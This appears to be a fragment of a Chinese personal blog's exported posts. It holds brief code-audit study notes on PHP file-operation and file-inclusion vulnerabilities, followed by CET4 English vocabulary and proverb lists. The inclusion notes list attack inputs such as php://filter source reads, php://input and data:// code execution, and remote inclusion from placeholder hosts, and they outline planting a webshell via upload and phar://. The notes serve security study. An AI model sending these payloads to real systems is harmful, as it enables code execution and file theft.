<p><a href="https://www.seebug.org/vuldb/ssvid-20898" target="_blank" rel="noopener">Nginx %00空字节执行任意代码(php)漏洞</a></p>
<p><br></p>
<center><strong>·End·</strong></center>

</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php文件操作漏洞]]></title>
      <url>/2017/12/18/php%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>文件操作漏洞学习笔记<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">



<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><h3 id="删除lock"><a href="#删除lock" class="headerlink" title="删除lock"></a>删除lock</h3><h2 id="任意文件复制"><a href="#任意文件复制" class="headerlink" title="任意文件复制"></a>任意文件复制</h2><h3 id="jpg2php"><a href="#jpg2php" class="headerlink" title="jpg2php"></a>jpg2php</h3><h3 id="php2txt"><a href="#php2txt" class="headerlink" title="php2txt"></a>php2txt</h3><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><h2 id="任意文件获取"><a href="#任意文件获取" class="headerlink" title="任意文件获取"></a>任意文件获取</h2><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h2 id="写入任意文件"><a href="#写入任意文件" class="headerlink" title="写入任意文件"></a>写入任意文件</h2></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> PHP文件操作漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php文件包含漏洞Summary]]></title>
      <url>/2017/12/17/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>文件包含漏洞学习笔记<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">



<p>相关函数：</p>
<p>include($file)</p>
<p>include($path.$filename.$ext)</p>
<h2 id="本地包含LFI"><a href="#本地包含LFI" class="headerlink" title="本地包含LFI"></a>本地包含LFI</h2><h3 id="限制后缀-php"><a href="#限制后缀-php" class="headerlink" title="限制后缀 *.php"></a>限制后缀 *.php</h3><h4 id="伪协议-zip-amp-phba"><a href="#伪协议-zip-amp-phba" class="headerlink" title="伪协议 zip:// &amp;phba//"></a>伪协议 zip:// &amp;phba//</h4><p>限制路径（$path），不能用伪协议和远程文件包含</p>
<p>限制路径，不限制后缀，可包含日志&amp;环境变量&amp;session文件&amp;临时文件</p>
<p>路径后缀都限制–&gt;无法利用</p>
<p>审计思路：根据include()的内容，判断包含的后缀名–&gt;判断上传的后缀名，构造一句话木马–&gt;运用伪协议(phar://path/file/xx.inc)–&gt;寻找php处理上传文件的方式，以及利用方式（全局搜索：$_FILES）–&gt;构造payload–&gt;测试是否已经包含一句话木马脚本–&gt;如何修复（定义一个数组，判断传递的数据是否存在于已设定的数组里或者限定路径和后缀php则不能用协议去读取任意文件）</p>
<blockquote>
<p>把时间信息（firebug抓包获得）转换为时间戳，推断文件名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;data_default_timezone_set(<span class="string">'UTC'</span>);</span><br><span class="line">&gt;<span class="keyword">echo</span> strtotime(<span class="string">''</span>);</span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><a href="http://blog.csdn.net/u010726042/article/details/75041367" target="_blank" rel="noopener">php文件包含+伪协议+文件上传漏洞利用实例</a></p>
<p><a href="http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener">php 伪协议</a></p>
<h4 id="截断大法"><a href="#截断大法" class="headerlink" title="截断大法"></a>截断大法</h4><p>（php更新之后已修复）</p>
<h3 id="日志-amp-环境变量"><a href="#日志-amp-环境变量" class="headerlink" title="日志&amp;环境变量"></a>日志&amp;环境变量</h3><h3 id="session文件"><a href="#session文件" class="headerlink" title="session文件"></a>session文件</h3><h3 id="结合phpinfo-包含临时文件"><a href="#结合phpinfo-包含临时文件" class="headerlink" title="结合phpinfo 包含临时文件"></a>结合phpinfo 包含临时文件</h3><h3 id="无后缀限制，包含任意文件"><a href="#无后缀限制，包含任意文件" class="headerlink" title="无后缀限制，包含任意文件"></a>无后缀限制，包含任意文件</h3><h3 id="读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php"><a href="#读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php" class="headerlink" title="读取任意文件，?file=php://filter/convert base64 encode/resource=index.php"></a>读取任意文件，?file=php://filter/convert base64 encode/resource=index.php</h3><h2 id="远程包含RFI-（默认off）"><a href="#远程包含RFI-（默认off）" class="headerlink" title="远程包含RFI （默认off）"></a>远程包含RFI （默认off）</h2><h3 id="allow-url-include-amp-amp-allow-url-fopen-Off"><a href="#allow-url-include-amp-amp-allow-url-fopen-Off" class="headerlink" title="allow_url_include &amp;&amp; allow_url_fopen= Off"></a>allow_url_include &amp;&amp; allow_url_fopen= Off</h3><h4 id="代码执行，-file-php-input"><a href="#代码执行，-file-php-input" class="headerlink" title="代码执行，?file=php://input"></a>代码执行，?file=php://input</h4><h4 id="利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo"><a href="#利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo" class="headerlink" title="利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo="></a>利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo=</h4><h3 id="allow-url-fopen-On"><a href="#allow-url-fopen-On" class="headerlink" title="allow_url_fopen = On"></a>allow_url_fopen = On</h3><h4 id="远程代码执行-file-http-https-ftp-xxx-file"><a href="#远程代码执行-file-http-https-ftp-xxx-file" class="headerlink" title="远程代码执行 ?file=[http|https|ftp]://xxx/file"></a>远程代码执行 ?file=[http|https|ftp]://xxx/file</h4><h4 id="利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode"><a href="#利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode" class="headerlink" title="利用XSS执行任意代码 ?file=http://xxx/xss.php?css=phpcode"></a>利用XSS执行任意代码 ?file=<a href="http://xxx/xss.php?css=phpcode" target="_blank" rel="noopener">http://xxx/xss.php?css=phpcode</a></h4><h4 id="远程代码执行-file-http-https-ftp-xxx-file-txt-23"><a href="#远程代码执行-file-http-https-ftp-xxx-file-txt-23" class="headerlink" title="远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]"></a>远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]</h4></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> PHP文件包含漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Authentic Words Summary]]></title>
      <url>/2017/12/16/authenticwords/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>​    此时此景，从CET4考场出来，只想送自己一首《凉凉》……<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>​    </p>
<p>​    看来我“High Marks Pass CET4“要翻水水了～～30分钟不打草稿的作文，自己都不知道写的什么鬼～～听力也～～emm～～冷得脑壳短路———magnificent（宏伟的）、altitude（海拔）我死都想不起来。。还有。。。emperor……一系列单词好像都拼错了一个字母～～Mountain Tai（泰山）被我拼成“Mountain Thai”～～搞啥子！！</p>
<hr>
<p>“物以类聚，人以群分”</p>
<p>跟网瘾少年一起玩，就也成为了网瘾骚年；跟学霸一起学习，就渐渐成为学霸。</p>
<p>当别人在寝室吃鸡，LOL的时候，你在图书馆孜孜不倦地阅读、学习。</p>
<p>或许这个时候，你抱怨自己没有过多的娱乐时间</p>
<p>但是，诸法因缘生，诸法因缘灭</p>
<p>希望若干年后，你会庆幸此时的自己没有虚度光阴……</p>
<hr>
<h1 id="CET4"><a href="#CET4" class="headerlink" title="CET4"></a>CET4</h1><h2 id="Writing"><a href="#Writing" class="headerlink" title="Writing"></a>Writing</h2><h3 id="闪光词"><a href="#闪光词" class="headerlink" title="闪光词"></a>闪光词</h3><pre><code>//2017.12.16
支持，赞成    in favor of, agree with, approve of 
提倡    advocate, recommend 
反对    oppose, object to
抵制    resist 
意义深远的，重大的    far-reaching, profound , significant
描绘，描述，描写    depict, describe, picture 
表达    convey, express, deliver 
使信服    convince, assure, confirm 
有敌意的，反对的    hostile, adverse, aggressive 
减少，削弱    reduce, decrease, lessen 
唯一的，仅有的    sole, single, unique 
全面的，全部的    entire, overall, comprehensive 
教授    tutor, coach, educate
显示    point to, indicate, demonstrate 
缩短，减少    shorten, cut down 
忧虑的，不安的    anxious, uneasy, concerned 
有机会    stand a chance of, have an opportunity to 
有偏见的，偏心的    biased, prejudiced, partial 
低等的，次要的    inferior, junior, minor 
明智的，合理的    advisable, sensible, rational 
提高    improve, enhance, raise 
给予，捐赠，赠与    impart, donate, contribute
沮丧的，失意的    frustrated, discouraged, depressed, low-spirited  
努力做，尽力做    attempt to, make efforts to, endeavor to, manage to do 
证实，证明    testify, confirm, verify, turn out 
志气，抱负，渴望    ambition, thirst 
禁止    ban, prohibit, forbid 
开展，实施，做    practice, carry out, conduct, perform
强调，突出    lay/place emphasis on, attach emphasis to, stress on, highlight
优秀的    outstanding, perfect, brilliant, remarkable, distinguished, excellent  
珍爱，珍惜，重视    cherish, treasure, value  
全面的，彻底的    sheer, utter, thorough 
注定    be doomed to, be destined to 
解释    account for, illustrate, clarify 
令人厌倦的    tedious, dull, monotonous, annoying 
不计其数的    countless, endless, numerous,
教育性的，启发性的    beneficial, enlightening, instructive 
有价值的    valuable, precious 
逐步地    step by step, little by little, bit by bit 
熟人    acquaintance 
伙伴    associate
密友，知己    intimate
坚持不懈的    persistent 
不屈服的    unyielding 
坚持的    insistent 
有决心的    determined, resolute, resolved 
坚决的    firm ，decided  
足够的，充足的    sufficient, adequate 
永久地    permanently, constantly 
抛弃，放弃    desert, abandon 
巨大的    tremendous, huge, giant , enormous 
因为    due to, owing to, thanks to 
占有，持有，拥有    occupy, hold, own, possess 
吸引    fascinate, tempt 
上升    increase, ascend, go up, rise, mount, on the rise, roar 
冷淡的，漠不关心的    indifferent, unconcerned, uninterested, chilly 
证实，证明    testify, confirm, verify, turn out 
</code></pre><h3 id="谚语"><a href="#谚语" class="headerlink" title="谚语"></a>谚语</h3><pre><code>//2017.12.16
1.爱屋及乌 Love me, love my dog.
2.百闻不如一见（眼见为实） Seeing is believing
3.比上不足比下有余 worse off than some, better off than many; to fall short of the best, but be better than the worst
4.笨鸟先飞 A slow sparrow should make an early start.
5.不眠之夜 white night
6.不以物喜不以己悲 not pleased by external gains, not saddened by personal losses
7.不遗余力 spare no effort; go all out; do one’s best
8.不打不成交 No discord, no concord
9.拆东墙补西墙 rob Peter to pay Paul
10.辞旧迎新 bid farewell to the old and usher in the new; ring out the old year and ring in the new
11.大事化小小事化了 try first to make their mistake sound less serious and then to reduce it to nothing at all
12.大开眼界 open one&apos;s eyes; broaden one&apos;s horizon; be an eye-opener
13.国泰民安 The country flourishes and people live in peace 
14.过犹不及 going too far is as bad as not going far enough; beyond is as wrong as falling short; too much is as bad as too little
15.功夫不负有心人 Everything comes to him who waits.
16.好了伤疤忘了疼 once on shore, one prays no more
17.好事不出门恶事传千里 Good news never goes beyond the gate, while bad news spread far and wide.
18.和气生财 Harmony brings wealth.
19.活到老学到老 One is never too old to learn.
20.既往不咎 let bygones be bygones
21.金无足赤人无完人 Gold can&apos;t be pure and man can&apos;t be perfect.
22.金玉满堂 Treasures fill the home.
23.脚踏实地 be down-to-earth
24.脚踩两只船 sit on the fence
25.君子之交淡如水 the friendship between gentlemen is as pure as crystal; a hedge between keeps friendship green
26.老生常谈陈词滥调 cut and dried, cliché
27.礼尚往来 Courtesy calls for reciprocity.
28.留得青山在不怕没柴烧 Where there is life, there is hope.
29.马到成功 achieve immediate victory; win instant success
30.名利双收 gain in both fame and wealth
31.茅塞顿开 be suddenly enlightened
32.没有规矩不成方圆 Nothing can be accomplished without norms or standards. 33.每逢佳节倍思亲 On festive occasions more than ever one thinks of one&apos;s dear ones far away.It is on the festival occasions when one misses his dear most.
34.谋事在人成事在天 The planning lies with man, the outcome with Heaven. Man proposes, God disposes.
35.弄巧成拙 be too smart by half; Cunning outwits itself
36.拿手好戏 masterpiece
37.赔了夫人又折兵 throw good money after bad
38.抛砖引玉 a modest spur to induce others to come forward with valuable contributions; throw a sprat to catch a whale
39.破釜沉舟 cut off all means of retreat；burn one‘s own way of retreat and be determined to fight to the end
40.抢得先机 take the preemptive opportunities
41.巧妇难为无米之炊 If you have no hand you can&apos;t make a fist. One can&apos;t make bricks without straw.
42.千里之行始于足下 a thousand-li journey begins with the first step--the highest eminence is to be gained step by step
43.前事不忘后事之师 Past experience, if not forgotten, is a guide for the future. 44.前人栽树后人乘凉 One generation plants the trees in whose shade another generation rests.One sows and another reaps.
45.前怕狼后怕虎 fear the wolf in front and the tiger behind hesitate in doing something
46.强龙难压地头蛇 Even a dragon (from the outside) finds it hard to control a snake in its old haunt - Powerful outsiders can hardly afford to neglect local bullies.
47.强强联手 win-win co-operation
48.瑞雪兆丰年 A timely snow promises a good harvest.
49.人之初性本善 Man&apos;s nature at birth is good.
50.人逢喜事精神爽 Joy puts heart into a man.
51.人海战术 huge-crowd strategy
52.世上无难事只要肯攀登 Where there is a will, there is a way.
53.世外桃源 a fictitious land of peace away from the turmoil of the world;
54.死而后已 until my heart stops beating
55.岁岁平安 Peace all year round.
56.上有天堂下有苏杭 Just as there is paradise in heaven, ther are Suzhou and Hangzhou on earth
57.塞翁失马焉知非福 Misfortune may be an actual blessing.
58.三十而立 A man should be independent at the age of thirty.At thirty, a man should be able to think for himself.
59.升级换代 updating and upgrading (of products)
60.四十不惑 Life begins at forty.
61.谁言寸草心报得三春晖 Such kindness of warm sun, can’t be repaid by grass
62.水涨船高 When the river rises, the boat floats high.
63.时不待我 Time and tide wait for no man
64.杀鸡用牛刀 break a butterfly on the wheel
65.实事求是 seek truth from facts; be practical and realistic; be true to facts
66.说曹操，曹操到 Talk of the devil and he comes
67.实话实说 speak the plain truth; call a spade a spade; tell it as it is
68.实践是检验真理的唯一标准 practice is the sole criterion for testing truth
69.山不在高，有仙则名 no matter how high the mountain is, its name will spread far and wid if there is a fairy.
70韬光养晦 hide one’s capacities and bide one’s time
71.糖衣炮弹 sugar-coated bullets
72.天有不测风云 anything unexpected may happen. A bolt from the blue
73.团结就是力量Unity is strength.
74.“跳进黄河洗不清”&apos;eve if one jumped into the Yellow River, one can not wash oneself clean--there&apos;s nothing one can do to clear one&apos;s name &apos;
75.歪风邪气unhealthy practices and evil phenomena
76.物以类聚，人以群分Birds of a feather flock together.
77.往事如风&apos;The past has vanished (from memory) like wind.; What in past, is pas
78.望子成龙hold high hopes for one&apos;s child
79.屋漏又逢连阴雨Misfortunes never come singly. When it rains it pours.
80.文韬武略military expertise; military strategy
81.唯利是图draw water to one&apos;s mill
82.无源之水,无本之木water without a source, and a tree wiithout roots
83.无中生有make create something out of nothing
84.无风不起浪There are no waves without wind. There&apos;s no smoke without fire. 85.徇私枉法bend the law for the benefit of relatives or friends
86.新官上任三把火a new broom sweeps clean
87.虚心使人进步,骄傲使人落后Modesty helps one go forward, whereas conceit makes one lag behind.
88. 蓄势而发accumulate strength for a take-off
89.心想事成May all your wish come true
90.心照不宣have a tacit understanding; give tacit consent; tacit understanding
91.先入为主First impressions are firmly entrenched.
92.先下手为强catch the ball before the bound
93.像热锅上的蚂蚁like an ant on a hot pan
94.现身说法warn people by taking oneself as an example
95.息事宁人pour oil on trobled waters
96.喜忧参半mingled hope and fear
97.循序渐进step by step
98.一路平安，一路顺风wish you a saft / good trip / journey
99.严以律己，宽以待人be strict with oneself and lenient towards others
100. 优胜劣汰survival of the fittest
101.有情人终成眷属All shall be well, and Jack shall have Jill.
102.有钱能使鬼推磨Money makes the mare go. Money talks.
103. 有识之士people of vision
104.有勇无谋use brawn rather than brain
105.有缘千里来相会Separated as we are thousands of miles apart, we come together as if by predestination.
106.与时俱进advance with times
107.以人为本people oriented; people foremost
108.因材施教teach students according to their aptitude
109.欲穷千里目，更上一层楼&apos;to ascend another storey to see a thousand miles further; Ascend further, were you to look farther; Would eye embrace a thousand miles? Go up, one flight.&apos; a land of milk and honey
110.欲速则不达Haste does not bring success.
112.英雄所见略同Great minds think alike.
113.冤家宜解不宜结Better make friends than make enemies.
114.冤假错案&apos;cases in which people were unjustly, falsely or wrongly charged or sentenced; unjust, false or wrong cases&apos;
115.一言既出，驷马难追A real man never goes back on his words.
116.招财进宝Money and treasures will be plentiful
117.债台高筑become debt-ridden
118. 众矢之的target of public criticism
119. 纸上谈兵be an armchair strategist
120.知己知彼,百战不殆Know the enemy and know yourself, and you can fight a hundred battles with no danger of defeat.
121.纸包不住火Truth will come to light sooner or later.
122.左右为难between the devil and the deep blue sea
</code></pre><h2 id="Translation"><a href="#Translation" class="headerlink" title="Translation"></a>Translation</h2><h3 id="描述人口、位置、大小……"><a href="#描述人口、位置、大小……" class="headerlink" title="描述人口、位置、大小……"></a>描述人口、位置、大小……</h3><pre><code>//2017.12.16
with the population of
with the area of 
located at/in
</code></pre><h3 id="中国经济："><a href="#中国经济：" class="headerlink" title="中国经济："></a>中国经济：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">　　总需求 aggregate demand </span><br><span class="line">　　总供给 aggregate supply </span><br><span class="line">　　企业文化 corporate/entrepreneurial culture </span><br><span class="line">　　企业形象 corporate image (Cl); enterprise image </span><br><span class="line">　　跨国公司 cross-national corporation </span><br><span class="line">　　创业精神 enterprising spirit; pioneering spirit </span><br><span class="line">　　外资企业 foreign-funded enterprise</span><br><span class="line">　　猎头公司head-hunter </span><br><span class="line">　　假日经济 holiday economy </span><br><span class="line">　　人力资本human capital </span><br><span class="line">　　航空和航天工业aerospace industry </span><br><span class="line">　　飞机制造工业aircraft industry </span><br><span class="line">　　电子工业 electronic industry </span><br><span class="line">　　汽车制造工业 car industry </span><br><span class="line">　　娱乐业 entertainment industry </span><br><span class="line">　　信息产业 information industry </span><br><span class="line">　　知识密集型产业 knowledge-intensive industry </span><br><span class="line">　　国有大中型企业 large and medium-sized state-owned enterprises </span><br><span class="line">　　轻工业 light industry </span><br><span class="line">　　博彩业 lottery industry </span><br><span class="line">　　制造业 manufacturing industry </span><br><span class="line">　　垄断行业 monopoly industries </span><br><span class="line">　　市场多元化 market diversification </span><br><span class="line">　　市场经济 market economy </span><br><span class="line">　　市场监管 market supervision </span><br><span class="line">　　购买力 purchasing power </span><br><span class="line">　　熊市 bear market </span><br><span class="line">　　牛市 bull market </span><br><span class="line">　　城镇化 urbanization </span><br><span class="line">　　房地产 real estate </span><br><span class="line">　　首付 down-payment </span><br><span class="line">　　业主 home owner</span><br><span class="line">　　个人购房贷款 individual housing loan </span><br><span class="line">　　经济全球化 economic globalization </span><br><span class="line">　　经济特区 special economic zones (SEZ)</span><br><span class="line">　　经济增长 economic growth </span><br><span class="line">　　泡沫经济 bubble economy 关税tariff</span><br><span class="line">　　纳税人tax payer </span><br><span class="line">　　宏观经济macro economy </span><br><span class="line">　　货币投放量 the size of money supply </span><br><span class="line">　　流动性过剩excess liquidity </span><br><span class="line">　　经济过热 overheated economy </span><br><span class="line">　　通货膨胀inflation </span><br><span class="line">　　抑制通货膨胀curb inflation </span><br><span class="line">　　注入流动性 to inject liquidity </span><br><span class="line">　　贴现率 discount rate</span><br><span class="line">　　存款准备金率 reserve requirement ratio (RRR)</span><br><span class="line">　　公开市场业务 open market operation (OMO)</span><br><span class="line">　　逆回购 reverse repurchase agreement; reverse repo </span><br><span class="line">　　引导降低市场借贷成本to guide the market borrowing costs to a lower level </span><br><span class="line">　　稳健的货币政策prudent monetary policy </span><br><span class="line">　　微调货币政策 to fine-tune monetary policy</span><br><span class="line">　　硬着陆 hard landing </span><br><span class="line">　　软着陆 soft landing </span><br><span class="line">　　二十国集团 Group of Twenty (G2O)</span><br><span class="line">　　财政部长 Finance Minister</span><br><span class="line">　　全年预期经济增长目标the expected growth target for the whole year </span><br><span class="line">　　经济活力 economic vitality</span><br><span class="line">　　大规模经济刺激计划 a massive economic stimulus package </span><br><span class="line">　　结构改革 structural reform</span><br><span class="line">　　硬资产 hard assets </span><br><span class="line">　　软资产 soft assets </span><br><span class="line">　　有形资产 tangible assets </span><br><span class="line">　　经济走廊 economic corridor </span><br><span class="line">　　整顿市场秩序 to rectify the market order </span><br><span class="line">　　反垄断 antitrust; anti-monopoly </span><br><span class="line">　　定价浮动 price fluctuations </span><br><span class="line">　　谋求利益最大化 to maximize profit </span><br><span class="line">　　债务审计audit of debt</span><br><span class="line">　　地方性政府债务 local government debt/liability </span><br><span class="line">　　公共财政体制改革 an overhaul of the public finance system</span><br><span class="line">　　债务管理 debt management </span><br><span class="line">　　信用支持 credit support</span><br></pre></td></tr></table></figure>
<h3 id="中国社会"><a href="#中国社会" class="headerlink" title="中国社会"></a>中国社会</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">　　多元文化论 cultural pluralism </span><br><span class="line">　　文化适应 acculturation </span><br><span class="line">　　社会保障 social security </span><br><span class="line">　　班车 shuttle bus</span><br><span class="line">　　相定迁户 a relocated unit or household </span><br><span class="line">　　大龄青年 single youth above the normal matrimonial age</span><br><span class="line">　　独生子女 the only child in a family </span><br><span class="line">　　单亲 single parent </span><br><span class="line">　　福利彩票 welfare lotteries </span><br><span class="line">　　家政服务 household management service </span><br><span class="line">　　民工 migrant laborers </span><br><span class="line">　　名人 celebrity</span><br><span class="line">　　农村剩余劳动力 surplus rural labor/laborers </span><br><span class="line">　　青春期 puberty</span><br><span class="line">　　全民健身运动 nationwide fitness campaign </span><br><span class="line">　　全国人口普查 nationwide census </span><br><span class="line">　　社会保险 social insurance </span><br><span class="line">　　暂住证 temporary residence permit/card </span><br><span class="line">　　青少年犯罪 juvenile delinquency </span><br><span class="line">　　性骚扰 sexual harassment </span><br><span class="line">　　走私 smuggling</span><br><span class="line">　　*性另歧视 gender/sexual discrimination </span><br><span class="line">　　年龄歧视 age discrimination </span><br><span class="line">　　工作歧视 job discrimination </span><br><span class="line">　　享乐主义hedonism </span><br><span class="line">　　文盲 illiteracy</span><br><span class="line">　　贫富分化 disparity between the rich and the poor </span><br><span class="line">　　